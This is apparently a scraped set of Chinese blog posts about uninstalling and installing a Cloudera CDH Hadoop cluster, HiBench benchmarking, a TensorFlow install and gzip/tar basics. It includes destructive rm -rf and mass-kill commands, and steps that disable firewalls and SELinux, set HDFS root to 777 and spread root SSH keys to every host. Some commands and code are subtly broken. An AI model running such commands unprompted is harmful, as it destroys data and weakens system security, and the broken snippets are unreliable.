[root@master ~]# rm -rf /usr/share/cmf /var/lib/cloudera* /var/cache/yum/x86_64/6/cloudera* /var/log/cloudera* /var/run/cloudera*  /etc/cloudera* 

3.卸载安装包：

[root@slave1 ~]# rpm -qa | grep cloudera
[root@slave2 ~]# for f in `rpm -qa | grep cloudera `  ; do rpm -e ${f} ; done     

（如果有保存，在执行一遍）
4.清除安装文件
shell 脚本如下：这一行很长，请复制全 
 
 rm -rf /var/lib/hadoop-* /var/lib/impala /var/lib/solr /var/lib/zookeeper /var/lib/hue /var/lib/oozie  /var/lib/pgsql  /var/lib/sqoop2  /data/dfs/  /data/impala/ /data/yarn/  /dfs/ /impala/ /yarn/  /var/run/hadoop-*/ /var/run/hdfs-*/ /usr/bin/hadoop* /usr/bin/zookeeper* /usr/bin/hbase* /usr/bin/hive* /usr/bin/hdfs /usr/bin/mapred /usr/bin/yarn /usr/bin/sqoop* /usr/bin/oozie /etc/hadoop* /etc/zookeeper* /etc/hive* /etc/hue /etc/impala /etc/sqoop* /etc/oozie /etc/hbase* /etc/hcatalog  

//只删除hadoop系列的，不要删除其他软件的，否则其他软件的版本控制会被破坏

[root@master alternatives]# rm -rf ` find /var/lib/alternatives/* ! -name “mta” ! -name “print” ! -name “zlibrary-ui”  -mtime -3` 
[root@master alternatives]# rm -rf /etc/alternatives/* 

5.杀死相关进程

for u in hdfs mapred cloudera-scm hbase hue zookeeper oozie hive impala flume; do sudo kill $(ps -u $u -o pid=); done

6.删除parcel包分发文件和解压文件

rm -rf /opt/cloudera/parcel-cache /opt/cloudera/parcels

到此卸载完毕。 










0.绪论
之前完全没有接触过大数据相关的东西，都是书上啊，媒体上各种吹嘘啊，我对大数据，集群啊，分布式计算等等概念真是高山仰止，充满了仰望之情，觉得这些东西是这样的：

当我搭建的过程中，发现这些东西是这样的：

对于初学者来说，我认为缺点如下：

1.需要控制，配置的东西太多，并且配置对应并不是很清晰（以后优化集群是否会有很高含金量？）
2.整个集群，我觉的从硬件到软件整体来说还是稳定性有待提高，尤其CDH   集群这块一会这个主机失去联系，一会NameNode挂，一会monitor挂，整个使用过程就是在不断的挂，看日志，挑错。基本离自动化，智能化还有很大距离。

CDH集群测试主要包括以下几个方面的内容：
1.装机（pxe），搭建服务器集群基础环境 
2.安装CDH集群，调试集群的健康状况，使集群可用 
3.测试集群性能，优化集群，使用测试框架（如Intel的HiBench框架）测试集群性能

1.基础建设简称基建
上一篇文章，我们已经介绍了集群安装操作系统的大杀器：
 pxe无人值守安装linux机器笔记
在批量安装完毕系统之后，本节主要围绕搭建CDH集群的基础建设进行介绍，基础建设简称基建，主要是为了支撑CDH集群后序工作流畅进行的一系列Linux系统的设置工作，基础建设工作没有做好，后面安装使用集群过程中会出现很多莫名奇妙的错误。基建主要包括，免密登录，时间同步，格式化硬盘，挂载目录等一些设置，下面为大家分别介绍：
1.1 建立主机分发脚本
新建一个host文件里面逐行设置为主机ip 
eg.

192.168.1.1 
  192.168.1.2 
  192.168.1.3

新建一个自定义脚本文件：

#!/bin/sh 
      host= `cat host` 
      for i in   $host 
      do 
      echo $i 
   #将需要分发的命令复制在此处 
  Done

1.2 免密码登陆
配置免密码登录 
1. 执行ssh-keygen命令，点击两次“回车”，生成/root/.ssh/id_rsa.pub文件；(使用脚本分发下面两条命令) 
2. cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys 
3. scp -r /root/.ssh $hostname:/root/
1.3 配置主机基础环境

修改默认语言为英文

vi /etc/sysconfig/i18n  
  LANG=”en_US.UTF-8”

修改host文件

scp /etc/hosts root@$i:/etc

关闭防火墙以及SELinux

ssh $i ‘service iptables stop’ 
  ssh $i ‘chkconfig iptables off’ 
  ssh $i ‘service ip6tables stop’ 
  ssh $i ‘chkconfig ip6tables off’ 
  ssh $i ‘setenforce 0’ 
  ssh $i ‘echo ‘service iptables stop’ >> /etc/rc.local’ 
  ssh $i ‘echo ‘service ip6tables stop’ >> /etc/rc.local’ 
  ssh $i ‘sed -i ‘s/SELINUX=enforcing/SELINUX=disabled/g’ /etc/selinux/config’

同步时间 启动ntp服务，每5分钟向服务器同步一次（还需修改时间服务器上的部分配置，具体请百度）

ssh $i ‘cat >>/var/spool/cron/root  << EOF 
  */5 * * * * /usr/sbin/ntpdate serverIP> /dev/null 2>&1 
  EOF’ 
  ssh $i ‘echo ‘SYNC_HWCLOCK=yes’ >> /etc/sysconfig/ntpd’ 
  ssh $i ‘hwclock -w’

修改用户句柄限制

ssh $i ‘cat >> /etc/security/limits.conf << EOF 
  hadoop  soft    nofile  65000 
  hadoop  hard    nofile  65000 
  hadoop  soft    nproc  401408 
  hadoop  hard    nproc  401408 
  *  soft    nofile  65000 
  *  hard    nofile  65000 
  *  soft    nproc  401408 
  *  hard    nproc  401408 
  EOF’

建立挂载目录(根据自己的硬盘个数)

ssh $i ‘mkdir /data01 /data02 /data03 /data04 /data05  /data06  /data07  /data08  /data09  ‘

格式化硬盘（需批量执行，此处脚本有待升级）

ssh $i  
  ‘yes|parted /dev/sdb mklabel gpt  
  parted /dev/sdb mkpart primary 0% 100% 
  mkfs.ext4 -T largefile /dev/sdb1

修改/etc/fstab文件

ssh $i ‘cat >> /etc/fstab << EOF 
  /dev/sdb1   /data01            ext4    defaults,noatime        0    0

挂载目录

ssh $i  
  ‘mount /dev/sdb1   /data01

关闭swap交换分区

ssh $i ‘swapoff -a’ 
  ssh $i ‘sysctl -w vm.swappiness=0’ 
  ssh $i ‘echo ‘vm.swappiness=0’ >> /etc/sysctl.conf’

关闭大内存页面

ssh $i ‘cat >> /sys/kernel/mm/transparent_hugepage/defrag << EOF 
  never 
  EOF
ssh $i ‘cat >> /etc/rc.local << EOF 
  echo never > /sys/kernel/mm/redhat_transparent_hugepage/defrag 
  EOF

卸载自带的java环境，可以根据自己的java版本卸载 
检查集群机器是否安装过openJDK,如果有安装过，请卸载，执行命令 ：

rpm -qa | grep jdk 
  rpm -e xxx #xxx为上一步输出的rpm包名
ssh $i  
  ‘rpm -e –nodeps java-1.6.0-openjdk-1.6.0.0-1.66.1.13.0.el6.x86_64 
  rpm -e –nodeps java-1.5.0-gcj-1.5.0.0-29.1.el6.x86_64 
  rpm -e –nodeps java-1.6.0-openjdk-devel-1.6.0.0-1.66.1.13.0.el6.x86_64 
  rpm -e –nodeps java-1.6.0-openjdk-javadoc-1.6.0.0-1.66.1.13.0.el6.x86_64’

安装pscp和scala包

ssh $i ‘rpm -i /root/rpms/pssh-2.3.1-5.el6.noarch.rpm /root/rpms/scala-2.10.4.rpm’

配置java1.8.0_66环境

scp -r /usr/java/jdk1.8.0_66 root@$i:/usr/java/ 
  ssh $i ‘rm -rf /usr/java/lastest’ 
  ssh $i ‘ln -s /usr/java/jdk1.8.0_66 /usr/java/lastest’
ssh $i ‘cat >> /etc/profile << EOF 
  JAVA_HOME=/usr/java/jdk1.8.0_66 
  CLASS_PATH=.:\$JAVA_HOME/lib/dt.jar:\$JAVA_HOME/lib/tools.jar 
  export JAVA_HOME 
  PATH=\$HOME/bin:\$JAVA_HOME/bin:\$PATH 
  export PATH 
  export CLASS_PATH 
  EOF’
scp /etc/profile root@$i:/etc/ 
  ssh $i ‘source /etc/profile’
done

时间同步

ssh $i ‘service ntpd stop 
  ntpdate lcgm2 
  ssh $i ‘hwclock -w’ 
  ssh $i ‘chkconfig ntpd on’ 
  done

配置yum源，开启http服务 
Yum源先mount在var/www/html/下面，在 
/etc/yum.repos.d/rhel-source.repo文件修改内容


一些可能用到的命令：
建立多级目录: mkdir -p /x/xx 
查看系统是否开启cloudera相关服务：chkconfig –list|grep cloudera 
查看eth0网卡网络速度：ethtool eth0|grep -i speed
1.4 绑定网卡
决定集群性能很大因素是集群的网络性能呢，所以一般大数据集群都是多个网卡绑定的bond0模式，绑定shell如下 
nmcli命令可能需要NetworkManager服务来支撑
 ifconfig
 systemctl stop firewalld.service 
 service iptables stop
 setenforce 0


 nmcli con add type bond con-name bond0 ifname bond0 mode 0
 nmcli con add type bond-slave con-name bondeno1 ifname eno1 master bond0
 nmcli con add type bond-slave con-name bondeno2 ifname eno2 master bond0
 nmcli con add type bond-slave con-name bondeno3 ifname eno3 master bond0
 nmcli con add type bond-slave con-name bondeno4 ifname eno4 master bond0

 cd /etc/sysconfig/network-scripts/
 vim ifcfg-bond0
    BOOTPROTO=static
    IPADDR=192.168.*.*
    PREFIX=24
    GATEWAY=192.168.*.*

 service network restart

 nmcli con reload

 nmcli con up bondeno4
 nmcli con up bondeno1
 nmcli con up bondeno2
 nmcli con up bondeno3
 nmcli con up bond0

2.安装配置Cloudera-Manager（离线）
在线安装方式由于需要安装的安装包过大，时间可能非常长，建议大家下载安装包进行离线安装。主要安装Cloudera Manager Server 和Agent。
2.1 离线仓库安装准备
在cloudrea下载离线仓库，下载地址 
    下载cm5： 
https://archive.cloudera.com/cm5/repo-as-tarball/5.8.0/cm5.8.0-centos6.tar.gz 
    下载cdh5： 
https://archive.cloudera.com/cdh5/parcels/5.8.0/ 
        列表： 
        CDH-5.8.0-1.cdh5.8.0.p0.42-el6.parcel 
        CDH-5.8.0-1.cdh5.8.0.p0.42-el6.parcel.sha1 
        manifest.json 
    下载验证：https://archive.cloudera.com/cm5/redhat/6/x86_64/cm/5.8.0/repodata/ 
    下载安装脚本： 
http://archive.cloudera.com/cm5/installer/latest/cloudera-manager-installer.bin
2.2 主节点解压安装
cloudera manager的目录默认位置在/opt下，解压：tar xzvf cloudera-manager*.tar.gz将解压后的cm-5.*和cloudera目录放到/opt目录下(类似在windows把软件安装在D：/software)。
为Cloudera Manager 5建立数据库，可以用Mysql，或者自带的postgresql ，本文采用自带的数据库进行测试。
配置离线仓库地址：

开启apache服务：service httpd start
将下载的cloudera仓库移到/var/www/html目录下，调整目录结构：

 
cdh5目录结构： 

cm5目录结构: 

chmod u+x cloudera-manager-installer.bin，然后./*.bin该文件相关启动脚本，就可以进入安装界面进行安装啦。

service cloudera-scm-server start (这个启动有点慢，可以关注日志变动情况 ) 
  service cloudera-scm-agent start 

其中，日志所在路径是  
/var/log/cloudera-scm-server/cloudera-scm-server.log  
启动server后，使用:

/sbin/iptables -I INPUT -p tcp –dport 7180 -j ACCEPT ( 打开7180端口 )

2.3 配置集群

1.根据CM引导界面，用户名admin ，密码admin。选择Cloudera Express 免费版。点击下一步到为CDH集群安装指定主机。 




2.输入需要安装集群的机器IP地址，包括Cloudera Manager Server 机器。
3.选择集群的安装方式，选择使用数据包，CDH版本选择自定义，并输入yum源地址（基建中已经配置了的） 


 
（上图链接地址https可能会出错）
升级过程中遇到的问题 
提示Error Cannot retrieve repository metadata [repomod.xml] for cloudera-cdh5.Please verify its path and try again
(1) 检查机器的yum及cloudera的yum源配置是否正确 
(2) 在Cloudera升级步骤(5)中填写的apache上cm5包地址是否正确，协议应该使用http而不是https，不然就会出现这种错误 
(3)   若没有显示本地parcel包，可能是路径填写错误，可以根据配置的远程yum地址重新填写。

4.集群安装状态，可以看到每台集群的安装状态，如果正常则进入下一步。
5.选择要安装的CDH组件，我们选择安装HBase、HDFS、Hive、Spark、YARN、Zookeeper服务。点击继续（hibench测试主要需要这几个组件），角色服务分配参考如下：



6. CM会检测安装环境，可能会提示一处安装警告，比如： 
cloudera 建议将/proc/sys/vm/swappiness设置为0，当前设置为60，  
则我们需要在集群每台机器上执行命令：


echo 0> /proc/sys/vm/swappiness

王道就是有错就看日志调试。 


7.选择集群机器的角色分配，对于默认的选择都可以选择在Master机器上，当然像Second NameNode可以选择在非NameNode机器上。注意Cloudera Management Service都选Master。
8.数据库配置。根据创建数据表选择所对应的服务即可。
9.集群设置。选择默认，集群开始安装，完成，访问集群serverIP:7180/cmf，ok。

2.4 集群基本优化
2.4.1 关闭Linux THG服务
检查集群中的各个主机的THG（对虚拟化等的内存资源分配是有好处的，但是对hadoop离线计算IO密集型操作是没有优势的，关闭THG可加快处理速度）

1.查看THG

cat /sys/kernel/mm/redhat_transparent_hugepage/defrag

2.关闭THG

echo never > /sys/kernel/mm/redhat_transparent_hugepage/defrag


2.4.2 设置linux内核参数：vm.swappiness
vm.swappiness值的范围为0~100，作用是控制应用数据在物理内存和虚拟内存之间的交换，值越低，交换的越少。默认值为60。
查看集群各个主机的此参数值：

cat /proc/sys/vm/swappiness

建议调整值为1：

sysctl -w vm.swappiness=1

2.4.3 配置HDFS
点击HDFS -> 配置 -> 高级：hdfs-site.xml 的 HDFS 服务高级配置代码段（安全阀），加入配置使用公平队列
<property>  
    <name>ipc.8020.callqueue.impl</name>
    <value>org.apache.hadoop.ipc.FairCallQueue</value>
</property>
2.4.4 配置Yarn资源
关于Yarn内存分配与管理，主要涉及到了ResourceManage（集群资源调度协调）、ApplicationMatser（任务资源配置）、NodeManager（YARN节点代理配置）这几个概念，相关的优化也要紧紧围绕着这几方面来开展。
点击Yarn -> 资源管理：

设置ApplicationMaster Java最大堆栈：800M(AM内存默认1G)
容器内存yarn.nodemanager.resource.memory-mb 
计算一个节点需要分配的容器内存方法： 
主机内存-操作系统预留内存(12G) - Cloudera Manager Agent(1G) - HDFS DN(1G) – Yarn    NM(1G) 
= 主机内存-15G

如果安装了hive.需减掉12G左右内存. 
如果安装了hbase.还需减掉12-16G内存。 
如果安装impala.还需减掉至少16G内存。
例：64G内存主机，如果安装了hbase,hive，则建议分配的容器内存大约为：25~30G

容器虚拟CPU内核yarn.nodemanager.resource.cpu-vcores
计算一个节点需要分配的容器虚拟内核方法： 
(主机cpu核数 – 系统预留1 – Cloudera1 – HDFS1 – Yarn NN 1) * 4 
Hbase : -1 
例：24核机器，为yarn分配可用cpu核数大约20核左右，按照 核数:处理任务数=1:4(比例可酌情调整)，建议分配为80。由于本次集群CPU计算能力没达到官网建议的比例的要求，大约分配的比例为1:2，分配的核数为30核左右。
高级配置中：mapred-site.xml 的 MapReduce 客户端高级配置代码段（安全阀）

<property>
    <name>mapreduce.tasktracker.outofband.heartbeat</name>
    <value>true</value>
</property>
2.4.5 配置oozie
点击oozie –> 配置 -> 高级 ： oozie-site.xml 的 Oozie Server 高级配置代码段（安全阀），增加配置：
<property>
<name>oozie.launcher.fs.hdfs.impl.disable.cache</name>
  <value>true</value>
</property>
<property>
<name>oozie.action.max.output.data</name>
  <value>5000000</value>
</property>
2.4.6 配置Oozie HA(用HAproxy负载均衡)

Web界面操作略
error： 
Oozie could not be start 
REASON:java.lang.noSuchFieldError:EXTERNAL_PROPERTY 
ERROR: java.lang.noSuchFieldError:EXTERNAL_PROPERTY 
 Org.cod… jaskson…

导致上面错误是oozie的jaskson版本低，替换成1.9.13版本即可 
只替换jackson-mapper-asl和jackson-core-asl即可
替换步骤：
1. 
先将192.168.188.13的两jar包拷贝到/opt/cloudera/parcels/CDH/lib/oozie下
2.

find . -name “jackson*” | grep -e “^./lib” | xargs -i dirname {} | sort |uniq | xargs -i cp jackson-* {}

3.

find . -name “jackson*” | grep -e “^./lib” | xargs -i dirname {} |sort | uniq | xargs -i mv {}/jackson-mapper-asl-1.8.8.jar .

4.

find . -name “jackson*” | grep -e “^./lib” | xargs -i dirname {} |sort | uniq | xargs -i mv {}/jackson-core-asl-1.8.8.jar .

2.4.7 其他优化
1.DRF策略
CDH集群调优：内存、Vcores和DRF
默认配置下，CPU核数和内存是1：1G的比例来启动任务的。可通过调整参数yarn.nodemanager.resource.memory-mb进行调整
2.每个container的分配多少内存和cpu
当应用程序向resource manager 申请资源（即申请container ）时， RM分配给一个container 多大的内存是按照一个最小单位进行分配的。 例如， 我们设置分配的最小单位为4GB， 则RM分配出来的container的内存一定是4G的倍数。  假设现在有一个程序向RM申请 5.1G的内存， 则RM会分配给它一个8GB的container去执行。 

yarn.scheduler.minimum-allocation-mb=4096

在实际执行map reduce的job中， 一个container实际上是执行一个map 或者reduce task的jvm的进程。 那么这个jvm在执行中会不断的请求内存，假设它的物理内存或虚拟内存占用超出了container的内存设定， 则node manager 会主动的把这个进程kill 掉。 
这里需要澄清一点， JVM使用的内存实际上分为虚拟内存和物理内存。  JVM中所有存在内存中的对象都是虚拟内存， 但在实际运行中只有一部分是实际加载在物理内存中的。 我们使用linux的top 可以看到 VM, RES,    前者是虚拟内存，后者可以看成近似是实际占用的物理内存。 因此在设置mapreduce的task的 jvm opts 参数时， 应将heap size 设置的比container允许的最大虚拟内存小。 这样jvm 不会因为申请过多的内存而被node manager 强制关闭。 当然设置最大heap size 如果在执行中被超过， jvm就会报 OutOfMemoryException。 
同时还有一个参数，设定了RM可以分配的最大的container是多大。   假设应用程序向RM申请的资源超过了这个值， RM会直接拒绝这个请求。 

yarn.scheduler.maximum-allocation-mb


3.HiBench集群性能测试
在大数据领域中，集群的性能很大程度上我认为主要是由整体的网络，数据吞吐量决定的，在使用HiBench测试时候发现，使用传统电口千兆网络的任务运行时间比光网任务运行时间要慢10s左右。HiBench的基准测试集是用来衡量一个大数据平台（基于Hadoop）性能的基准测试集，包含了文件系统的IO性能，系统的批处理吞吐，数据仓库用的OLAP分析算子，机器学习的处理能力，以及流处理系统的能力。
切换到光纤后，需要修改机器机器ip，这时候cdh居然没法启动了，百度之后，发现如果使用自带数据库postgresql，需要修改hosts表中记录的元数据信息：修改CDH集群ip
3.1 简介
hibench作为一个测试hadoop的基准测试框架，提供了对于hive：（aggregation，scan，join），排序（sort，TeraSort），大数据基本算法（wordcount，pagerank，nutchindex），机器学习算法（kmeans，bayes），集群调度（sleep），吞吐（dfsio），以及新加入5.0版本的流测试： 
we provide following streaming workloads for SparkStreaming, Storm . 

一个完整的TeraSort测试需要按以下三步执行：

用TeraGen生成随机数据
对输入数据运行TeraSort
用TeraValidate验证排好序的输出数据

所有hibench测试基本都是这样的流程，生成数据，运行，输出结果。
3.2 配置并编译HiBench
从GitHub下载HiBench开源包，本篇会基于HiBench-5.0为例。https://github.com/intel-hadoop/HiBench。如果是基于CDH 5.5测试，建议使用HiBench-5.0，其中包含了Spark 1.5的编译包。
编译

添加JAVA_HOME 环境变量
注释掉${HIBENCH_HOME} /src/streambench/pom.xml中两行

<!-- <module>stormbench</module> -->
<!-- <module>samzabench</module> -->

调用编译脚本：${HIBENCH_HOME}/bin/build-all.sh

配置

编辑 HiBench Configuration File：

cd ${HIBENCH_HOME}/conf
cp 99-user_defined_properties.conf.template 99-user_defined_properties.conf
编译配置文件，如下修改一些参数：
hibench.hadoop.home      /opt/cloudera/parcels/CDH/lib/hadoop 
  hibench.hadoop.mapreduce.home         /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce 
  hibench.spark.home                    /opt/cloudera/parcels/CDH/lib/spark 
  hibench.hdfs.master                   hdfs://cdh-node-11.cdhtest.com 
  hibench.hadoop.configure.dir          /etc/hadoop/conf 
  hibench.masters.hostnames            master # Resource Manager addresses 
  hibench.slaves.hostnames             hostname…
# Node Manager addresses
hibench.spark.master                  yarn-client 
  hibench.spark.version                spark1.6 
  spark.kryoserializer.buffer            2000m # 否则会出现大量spark.kryoserializer.buffer.mb被启用的警告 
  hibench.streamingbench.zookeeper.host         zookeeper-hostnames 
  hibench.streamingbench.brokerList             all-hostnames 
  hibench.streamingbench.kafka.home             /opt/cloudera/parcels/KAFKA

修改benchmarks.lst文件，只运行有必要的测试集，例：

#aggregation 
  #join 
  #kmeans 
  #pagerank 
  #scan 
  #sleep 
  sort 
  wordcount 
  #bayes 
  terasort 
  #nutchindexing 
  dfsioe

修改language.lst文件，只运行有必要的语言

cd ${HIBENCH_HOME}/conf
在language.lst文件中，将以下两行删除
spark/java 
  spark/python

修改load-config.py文件，确保Bench在运行时能找到唯一的包：

$HiBench-Home/bin/functions/load-config.py
将hadoop-mapreduce-client-jobclient*-tests.jar改为hadoop-mapreduce-client-jobclient-tests.jar

Bench在运行时有一些固化的目录和CDH不一致，需要建立目录引用

建立目录引用
mkdir -p /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/share/hadoop 
  cd /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce/share/hadoop 
  ln -sf /opt/cloudera/parcels/CDH/lib/hadoop-mapreduce mapreduce2

Bench会在HDFS根目录下生成文件，将HDFS的根目录权限修改为777：

sudo -u hdfs hadoop fs -chmod 777 /

（可选）如果在Kerberos启用的状况下，请增加以下步骤：

# 设置环境变量 
  export HIBENCH_HOME=/root/Downloads/HiBench-master 
  export JAVA_HOME=/usr/java/jdk1.7.0_67-cloudera 
  export JAVA_LIBRARY_PATH=$JAVA_LIBRARY_PATH:/opt/cloudera/parcels/CDH/lib/hadoop/lib/native 
  export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/cloudera/parcels/CDH/lib/hadoop/lib/native 
  export SPARK_YARN_USER_ENV=”JAVA_LIBRARY_PATH=$JAVA_LIBRARY_PATH,LD_LIBRARY_PATH=$LD_LIBRARY_PATH”
# 重新登录Kerberos 
  kdestroy 
  kinit -k -t  


运行

命令行输入 

  ${HIBENCH_HOME}/bin/run-all.sh

3.3 HiBench基本优化配置

**优化基本原则**

在固定数据量的前提下，一般设置成让MapReduce作业在一轮Map、Reduce内结束，否则会增加MapReduce进程的调度开销。但如果输入的数据量过大，有可能会因为单个Map或者Reduce的内存消耗过大而到时严重的GC问题，这个需要在运行时对Map或者Reduce任务进程需要监测。

**YARN基本配置**





–
–



NodeManager
Container vCores数量就是系统的virtual core的数量Container Memory配置成节点上可用内存的75%到80%之间（如128GB的机器，可以设置96GB）


ResourceManager
Fair Scheduler调度器最小容器内存1GB 最小容器CPU 1个核最大容器内存=NodeManager Container内存的75%~80%最大容器CPU=NodeManager Container CPU的75%~80%增量内存512MB增量CPU 1个核


Gateway
mapreduce.map/reduce.max.mb = 2GBmapreduce.map/reduce.java.opts = max.mb * 0.8



附录（CDH 相关目录结构功能简介）

**1.相关目录**




/var/log/cloudera-scm-installer : 安装日志目录。 
  /var/log/* : 相关日志文件（相关服务的及CM的）。 
  /usr/lib64/cmf/ : Agent程序代码。 
  /var/lib/cloudera-scm-server-db/data : 内嵌数据库目录。 
  /usr/bin/postgres : 内嵌数据库程序。 
  /etc/cloudera-scm-agent/ : agent的配置目录。 
  /etc/cloudera-scm-server/ : server的配置目录。 
  /etc/clouder-scm-server/db.properties 默认元数据库用户名密码配置 
  /opt/cloudera/parcels/ : Hadoop相关服务安装目录。 
  /opt/cloudera/parcel-repo/ : 下载的服务软件包数据，数据格式为parcels。 
  /opt/cloudera/parcel-cache/ : 下载的服务软件包缓存数据。 
  /etc/hadoop/* : 客户端配置文件目录。


**2.配置**


Hadoop配置文件：

配置文件放置于/var/run/cloudera-scm-agent/process/目录下。如：

/var/run/cloudera-scm-agent/process/193-hdfs-NAMENODE/core-site.xml

这些配置文件是通过Cloudera Manager启动相应服务（如HDFS）时生成的，内容从数据库中获得（即通过界面配置的参数）。
在CM界面上更改配置是不会立即反映到配置文件中，这些信息会存储于数据库中，等下次重启服务时才会生成配置文件。且每次启动时都会产生新的配置文件。
CM Server主要数据库为scm基中放置配置的数据表为configs。里面包含了服务的配置信息，每一次配置的更改会把当前页面的所有配置内容添加到数据库中，以此保存配置修改历史。
scm数据库被配置成只能从localhost访问，如果需要从外部连接此数据库，修改

vim /var/lib/cloudera-scm-server-db/data/pg_hba.conf

文件,之后重启数据库。运行数据库的用户为cloudera-scm。

查看配置内容

直接查询scm数据库的configs数据表的内容。 
访问REST API： http://hostname:7180/api/v4/cm/deployment，返回JSON格式部署配置信息。

配置生成方式

CM为每个服务进程生成独立的配置目录（文件）。所有配置统一在服务端查询数据库生成（因为scm数据库只能在localhost下访问）生成配置文件，再由agent通过网络下载包含配置文件的zip包到本地解压到指定的目录。

配置修改 
CM对于需要修改的配置预先定义，对于没有预先定义的配置,则通过在高级配置项中使用xml配置片段的方式进行配置。而对于/etc/hadoop/下的配置文件是客户端的配置，可以在CM通过部署客户端生成客户端配置。
数据库 
Cloudera manager主要的数据库为scm,存储Cloudera manager运行所需要的信息：配置，主机，用户等。
CM结构 
CM分为Server与Agent两部分及数据库（自带更改过的嵌入Postgresql）。它主要做三件事件： 
管理监控集群主机。 
统一管理配置。 
管理维护Hadoop平台系统。 
实现采用C/S结构，Agent为客户端负责执行服务端发来的命令，执行方式一般为使用python调用相应的服务shell脚本。Server端为Java REST服务，提供REST API，Web管理端通过REST API调用Server端功能，Web界面使用富客户端技术（Knockout）。 
Server端主体使用Java实现。 
Agent端主体使用Python, 服务的启动通过调用相应的shell脚本进行启动，如果启动失败会重复4次调用启动脚本。 
Agent与Server保持心跳，使用Thrift RPC框架。
升级 
在CM中可以通过界面向导升级相关服务。升级过程为三步： 
1.下载服务软件包。 
2.把所下载的服务软件包分发到集群中受管的机器上。 
3.安装服务软件包，使用软链接的方式把服务程序目录链接到新安装的软件包目录上。
卸载 
sudo /usr/share/cmf/uninstall-scm-express.sh, 然后删除/var/lib/cloudera-scm-server-db/目录，不然下次安装可能不成功。
开启postgresql远程访问 
CM内嵌数据库被配置成只能从localhost访问，如果需要从外部查看数据，数据修改vim /var/lib/cloudera-scm-server-db/data/pg_hba.conf文件,之后重启数据库。运行数据库的用户为cloudera-scm。


参考文献
1.CDH官方文档 
2.http://www.cloudera.com/documentation.html 
3.CDH5.8官方文档 http://www.cloudera.com/documentation/enterprise/latest.html 
4.http://blog.selfup.cn/1631.html#comment-403 
5.https://github.com/intel-hadoop/HiBench 









1.首先安装pip-install
在使用centos7的软件包管理程序yum安装python-pip的时候会报一下错误：
No package python-pip available. 
Error: Nothing to do 
说没有python-pip软件包可以安装。
这是因为像centos这类衍生出来的发行版，他们的源有时候内容更新的比较滞后，或者说有时候一些扩展的源根本就没有。所以在使用yum来search  python-pip的时候，会说没有找到该软件包。 
因此为了能够安装这些包，需要先安装扩展源EPEL。EPEL(http://fedoraproject.org/wiki/EPEL) 是由 Fedora 社区打造，为 RHEL 及衍生发行版如 CentOS、Scientific Linux 等提供高质量软件包的项目。 
首先安装epel扩展源：
sudo yum -y install epel-release

然后安装python-pip：
sudo yum -y install python-pip

安装完之后别忘了清除一下cache：
sudo yum clean all

搞定！
2.在隔离容器中安装TensorFlow
推荐使用virtualenv 创建一个隔离的容器, 来安装 TensorFlow. 这是可选的, 但是这样做能使排查安装问 
题变得更容易，照着敲命令就行了
安装主要分成下面四个步骤： 
  ● Install pip and Virtualenv.（这一步装过了） 
  ● Create a Virtualenv environment. 
  ● Activate the Virtualenv environment and install TensorFlow in it. 
  ● After the install you will activate the Virtualenv environment each time you want to use TensorFlow. 
Install pip and Virtualenv: 
 # Ubuntu/Linux 64-bit
$ sudo apt-get install python-pip python-dev python-virtualenv

# Mac OS X
$ sudo easy_install pip
$ sudo pip install --upgrade virtualenv

Create a Virtualenv environment in the directory ~/tensorflow:
$ virtualenv --system-site-packages ~/tensorflow

Activate the environment:
$ source ~/tensorflow/bin/activate  # If using bash
$ source ~/tensorflow/bin/activate.csh  # If using csh

(tensorflow)$  # Your prompt should change
Now, install TensorFlow just as you would for a regular Pip installation. First select the correct binary to install: 
 # Ubuntu/Linux 64-bit, CPU only, Python 2.7
    (tensorflow)$ export TF_BINARY_URL=https://storage.googleapis.com/tensorflow/linux/cpu/tensorflow-0.10.0rc0-cp27-none-linux_x86_64.whl

Finally install TensorFlow: 
 # Python 2
(tensorflow)$ pip install --upgrade $TF_BINARY_URL

出现了如下错误：
InstallationError: Command python setup.py egg_info failed with error code 1 in /root/tensorflow/build/mock

解决方案是： 
Distribute has been merged into Setuptools as of version 0.7. If you are using a version <=0.6, upgrade using :
pip install --upgrade setuptools 

or 
easy_install -U setuptools.

其实就是安装的egg需要升级一下把，我猜测
升级之后重新 ：
(tensorflow)$ pip install --upgrade $TF_BINARY_URL

等待一段时间，（我似乎看到tensorflow在用gcc编译c++，c，时间还挺长大概十来分钟） 
看到 
Successfully installed tensorflow protobuf six wheel mock numpy funcsigs pbr 
Cleaning up… 
就ok
3.测试代码
import tensorflow as tf
import numpy as np
# 使用 NumPy 生成假数据(phony data), 总共 100 个点.
x_data = np.float32(np.random.rand(2, 100)) # 随机输入
y_data = np.dot([0.100, 0.200], x_data) + 0.300

# 构造一个线性模型
b = tf.Variable(tf.zeros([1]))
W = tf.Variable(tf.random_uniform([1, 2], -1.0, 1.0))
y = tf.matmul(W, x_data) + b

# 最小化方差
loss = tf.reduce_mean(tf.square(y - y_data))
optimizer = tf.train.GradientDescentOptimizer(0.5)
train = optimizer.minimize(loss)
# 初始化变量
init = tf.initialize_all_variables()
# 启动图 (graph)
sess = tf.Session()
sess.run(init)
# 拟合平面
for step in xrange(0, 201):
        sess.run(train)
if step % 20 == 0:
        print step, sess.run(W), sess.run(b)

在命令行输入：
source ~/tensorflow/bin/activate

激活tensorflow环境，运行上述代码
(tensorflow)[root@www test]# python nihe.py

# 得到最佳拟合结果
  W: [[0.100 0.200]], b: [0.300]

退出虚拟环境：
(tensorflow)$ source deactivate

参考文献

https://github.com/tensorflow/tensorflow/blob/8cb0558da924e891aa1bb5d79a6c0c846301e4eb/tensorflow/g3doc/get_started/os_setup.md 
https://github.com/jikexueyuanwiki/tensorflow-zh 
http://www.tensorflow.org/（需要梯子）
 






 
2012-2-9 星期4
linux 常用命令：压缩解压命令
-gz命令的英文原意：Gnu zip
语法：gzip 选项[文件]
功能描述：压缩文件
压缩后文件格式： .gz
1. 只能压缩文件，不能压缩目录
2.不保留源文件
解压缩命令：gunzip
语法：gunzip选项[压缩文件]
功能描述：解压缩.gz的压缩文件
范例：gunzip file1.gz
压缩解压目录：tar
命令名称：tar
语法 tar选项[cvf][目录]
     -c 产生.tar打包文件
     -v 显示详细信息
     -f 指定压缩后的文件名
     -z 打包的同时压缩
压缩后的文件格式：.tar.gz
tar -zcvf dir1.tar.gz dir1
将目录dir1压缩成一个打包文件并压缩文件
file命令：查看文件的格式，文件类型
